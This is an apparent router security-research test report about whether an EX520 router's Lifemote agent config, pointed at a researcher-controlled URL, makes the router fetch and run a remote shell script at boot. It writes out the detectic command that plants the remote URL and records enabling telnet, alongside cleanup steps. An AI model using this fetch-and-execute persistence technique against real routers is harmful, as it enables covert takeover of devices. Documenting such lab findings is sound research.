# PHASE14.3_PRE_REBOOT_VALIDATION.md

## 1. Baseline (Pre-Test)

| Item | Value | Evidence |
|------|-------|----------|
| EX520 IPv6 | fe80::3e6a:d2ff:fe5f:abc1%enp2s0 | ip -6 neigh |
| EX520 MAC | 3c:6a:d2:5f:ab:c1 | ip -6 neigh |
| GTPR connectivity | PROVEN-LIVE | curl + detectic query |
| Lifemote enable | "0" (disabled) | GTPR gl DEV2_LIFEMOTE_AGENT |
| Lifemote state | "0" (not running) | GTPR gl DEV2_LIFEMOTE_AGENT |
| Lifemote URL | "" (empty) | GTPR gl DEV2_LIFEMOTE_AGENT |
| Telnet enable | "0" (disabled) | GTPR gl DEV2_TELNET_CFG |
| Telnet port | 23 | GTPR gl DEV2_TELNET_CFG |
| pwdSign | "1" (password changed) | GTPR gl DEV2_USER_CFG |
| phoenix.sh running | Unknown (no shell) | Cannot verify |
| Detectic running | No | No process |
| Existing markers | None | ls /tmp/ |

---

## 2. Exact Lifemote Configuration Used

```json
{
    "enable": "1",
    "URL": "http://192.168.0.27:8081/test_payload.sh",
    "stack": "0,0,0,0,0,0",
    "pstack": "0,0,0,0,0,0"
}
```

Applied via:
```
detectic set DEV2_LIFEMOTE_AGENT '{"enable":"1","URL":"http://192.168.0.27:8081/test_payload.sh","stack":"0,0,0,0,0,0","pstack":"0,0,0,0,0,0"}'
```

Result: `{"success":true, "errorcode":0}`

---

## 3. Controlled Endpoint

- **URL**: `http://192.168.0.27:8081/test_payload.sh`
- **Script**: `deploy/test_payload.sh`
- **Behavior**: Creates volatile marker in `/tmp/lifemote_autostart_test_<timestamp>_<pid>`
- **Marker contents**: timestamp, pid, hostname, marker_path
- **Risk**: NONE (volatile only, no config changes, no persistence)

---

## 4. Pre-Reboot Execution Proof

### 4.1 Configuration Storage (PROVEN-LIVE)

The `so` command successfully stored the Lifemote configuration:
- `enable`: "0" → "1" ✅
- `URL`: "" → "http://192.168.0.27:8081/test_payload.sh" ✅
- Configuration readable via `gl` after `so` ✅

### 4.2 Handler Trigger (FAILED)

**CRITICAL FINDING: The `so` command does NOT trigger the apply handler.**

Evidence:
- After `so` with `enable:1`, the `state` field remained "0"
- No HTTP request was received by the test server
- No execution marker was created on the router
- This was tested multiple times with different approaches

**The same finding applies to Telnet:**
- After `so` with `telnetLocalEnabled:1`, the Telnet port remained CLOSED
- The config was stored (readable via `gl`) but the handler (`telnetd -p %d &`) was NOT triggered

### 4.3 Architectural Implication

The `so` command stores configuration in the data model (in-memory + possibly to `misc_rw`), but does NOT trigger the apply handler. The apply handler is triggered by `dm_saveCfg` (config apply/save), which is called by:

1. **Web UI save** (when user clicks "Save" in the management page)
2. **Backup restore** (`dm_restoreCfg` → `dm_saveCfg`)
3. **Possibly `cos` at boot** (config re-apply from persisted data model)

This means:
- `so` = STORE config (no handler trigger)
- `dm_saveCfg` = APPLY config + trigger handlers
- Autostart depends on whether `cos` calls `dm_saveCfg` at boot

---

## 5. Configuration Persistence

### What persists:

| Field | Persisted? | Evidence |
|-------|-----------|----------|
| `DEV2_LIFEMOTE_AGENT.enable` | YES | Readable via `gl` after `so` |
| `DEV2_LIFEMOTE_AGENT.URL` | YES | Readable via `gl` after `so` |
| `DEV2_TELNET_CFG.telnetLocalEnabled` | YES | Readable via `gl` after `so` |
| `DEV2_USER_CFG.pwdSign` | YES | Readable via `gl` after `so` |

### What does NOT persist:

| Item | Persisted? | Evidence |
|------|-----------|----------|
| phoenix.sh process | NO | Would die on reboot (process) |
| telnetd process | NO | Would die on reboot (process) |
| /tmp markers | NO | Volatile (RAM) |

### Key insight:

The CONFIGURATION persists in the data model (stored in `misc_rw/0x00300000`). The PROCESSES started by the handlers do NOT persist (they die on reboot). The autostart question is whether `cos` re-applies the config at boot, which would re-trigger the handlers and restart the processes.

---

## 6. Expected Post-Reboot Observations

### If autostart WORKS (cos re-applies config):

1. Router boots
2. `rcS` starts `cos`
3. `cos` reads `misc_rw/0x00300000` (data model with `enable:1`)
4. `cos` calls `dm_saveCfg` or equivalent
5. `rsl_setDev2LifemoteAgentObj` handler fires
6. `phoenix.sh http://192.168.0.27:8081/test_payload.sh &` executes
7. `phoenix.sh` downloads `test_payload.sh` to `/tmp/lifemote_cpe_daemon.sh`
8. `sh /tmp/lifemote_cpe_daemon.sh &` executes
9. Test script creates marker in `/tmp`
10. HTTP request appears in our server log

### If autostart FAILS (cos does NOT re-apply config):

1. Router boots
2. `rcS` starts `cos`
3. `cos` reads `misc_rw/0x00300000` (data model with `enable:1`)
4. `cos` does NOT re-apply handlers (only loads config into memory)
5. No `phoenix.sh` starts
6. No HTTP request to our server
7. No marker created

---

## 7. Exact Criteria for PROVEN AUTOSTART

**AUTOSTART is PROVEN if and only if:**

AFTER reboot, **WITHOUT** issuing another `so` command, **WITHOUT** manually enabling Telnet, **WITHOUT** manually starting `phoenix.sh`:

1. HTTP request from EX520 appears in our server log for `test_payload.sh`
2. OR execution marker exists in `/tmp` on the router (requires shell to verify)

**AUTOSTART is DISPROVEN if:**

AFTER reboot, even with `enable:1` and URL configured in the data model:
1. No HTTP request from EX520 appears in our server log
2. No `phoenix.sh` process is running (requires shell to verify)

---

## 8. Cleanup Procedure

### After test (regardless of result):

```bash
# 1. Disable Lifemote
detectic set DEV2_LIFEMOTE_AGENT '{"enable":"0","URL":"","stack":"0,0,0,0,0,0","pstack":"0,0,0,0,0,0"}'

# 2. Verify disabled
detectic query DEV2_LIFEMOTE_AGENT

# 3. Kill any running phoenix.sh (if shell available)
killall phoenix.sh 2>/dev/null

# 4. Remove test markers (if shell available)
rm -f /tmp/lifemote_autostart_test_*
rm -f /tmp/lifemote_test_marker_path
rm -f /tmp/lifemote_cpe_daemon.sh
```

### If autostart FAILS and Lifemote keeps restarting:

```bash
# Disable via GTPR (should stop the supervisor loop)
detectic set DEV2_LIFEMOTE_AGENT '{"enable":"0","URL":"","stack":"0,0,0,0,0,0","pstack":"0,0,0,0,0,0"}'

# If still running, reboot clears all processes
reboot
```

---

## 9. Recovery Procedure

### If router becomes unresponsive:

1. **Power cycle**: Unplug router, wait 10 seconds, plug back in
2. **Factory reset**: Press reset button for 10 seconds (last resort)
3. **Configuration recovery**: All config changes are in `misc_rw` which is cleared by factory reset

### If Lifemote agent causes issues:

1. Disable via GTPR: `detectic set DEV2_LIFEMOTE_AGENT '{"enable":"0",...}'`
2. If GTPR unavailable: reboot clears all processes (Lifemote config persists but agent doesn't auto-start unless cos re-applies)

---

## 10. READY FOR REBOOT

**READY FOR REBOOT: NO**

### Reason:

The pre-reboot test revealed that the `so` command does NOT trigger apply handlers. The Lifemote configuration is stored but `phoenix.sh` was NOT started. This means:

1. The `so` command alone cannot prove autostart
2. The autostart depends entirely on whether `cos` re-applies config at boot
3. This cannot be determined without a reboot test

However, there is a **critical blocker**: the test payload HTTP server must be running and reachable from the EX520 when the reboot test is performed. The current HTTP server was stopped after the pre-reboot test.

### What is needed before reboot:

1. Restart the HTTP test server on port 8081
2. Verify EX520 can reach it (we know it can reach our IPv4 at 192.168.0.27)
3. Set Lifemote config to `enable:1` with URL pointing to test server
4. Reboot router
5. Wait for boot completion
6. Check HTTP server log for requests from EX520
7. If request found: AUTOSTART PROVEN
8. If no request: AUTOSTART DISPROVEN

### Status:

```
Pre-reboot test:     COMPLETED
Handler trigger:     FAILED (so does not trigger handler)
Config persistence:  PROVEN (config stored in data model)
Autostart:           UNKNOWN (depends on cos re-apply at boot)
Ready for reboot:    NO (need to restart HTTP server first)
```

---

## 11. Critical Finding Summary

| Finding | Impact |
|---------|--------|
| `so` does NOT trigger apply handlers | Autostart requires `dm_saveCfg`, not just `so` |
| Config IS persistent in data model | Configuration survives reboot |
| Processes are NOT persistent | phoenix.sh/telnetd die on reboot |
| `cos` re-apply behavior is UNKNOWN | Determines if autostart is possible |
| misc_rw is 1144 KB | Binary (1.26 MB) cannot fit |
| Telnet `so` also doesn't trigger handler | Same architectural limitation |

### Implication:

The only remaining autostart candidate is:
```
Boot → cos → dm_saveCfg → handler trigger → phoenix.sh → script execution
```

This CANNOT be proven without a reboot test. The reboot test requires:
1. HTTP server running and reachable
2. Lifemote config set to enable:1 with URL
3. Router reboot
4. Observation of HTTP requests from EX520
